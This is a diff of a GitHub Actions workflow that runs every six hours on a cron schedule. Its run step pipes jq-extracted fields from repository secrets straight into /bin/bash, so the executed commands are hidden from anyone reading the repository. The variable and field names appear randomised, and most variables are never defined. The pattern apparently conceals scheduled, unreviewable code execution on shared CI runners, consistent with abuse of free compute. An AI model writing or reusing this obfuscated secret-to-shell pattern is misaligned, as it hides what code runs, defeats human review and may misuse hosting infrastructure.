@@ -2,8 +2,9 @@ name: liulinglong6510
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
-jobs:  # 287
+    - cron: '5 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,14 +12,19 @@ jobs:  # 287
       - uses: actions/checkout@v4
       - name: liulinglong6510
         env:
-          b0: ${{ secrets.b0 }}
+          xwz10: ${{ secrets.xwz10 }}
         run: |
-          echo $b0 | jq -r .tycer86 | /bin/bash
-          echo $t16 | jq -r .kikd27 | /bin/bash
-          echo $kceu40 | jq -r .fpcj3794 | /bin/bash
-          echo $jyxcf104 | jq -r .qpzg90179 | /bin/bash
-          echo $drxz127 | jq -r .r13994 | /bin/bash
-          echo $u96 | jq -r .s35432 | /bin/bash
-          echo $gk4349 | jq -r .jptg372 | /bin/bash
-          echo $abth7 | jq -r .pubdt28971 | /bin/bash
+          echo $xwz10 | jq -r .z816 | /bin/bash
+          echo $bih1530 | jq -r .ngud571 | /bin/bash
+          echo $vm6749 | jq -r .z92858 | /bin/bash
+          echo $cxdzo44 | jq -r .v3 | /bin/bash
+          echo $jvlw138 | jq -r .fzh83681 | /bin/bash
+          echo $wan7 | jq -r .dbzxw4707 | /bin/bash
+          echo $xw9507 | jq -r .pvwtd69 | /bin/bash
+          echo $j42 | jq -r .jhehn15385 | /bin/bash
+          echo $bur69018 | jq -r .er6502 | /bin/bash
+          echo $gkt5 | jq -r .g13989 | /bin/bash
+          echo $e17 | jq -r .sbu15 | /bin/bash
+          echo $vlzxc2 | jq -r .rmjq9443 | /bin/bash
+          echo $pbk39 | jq -r .bm1 | /bin/bash
 
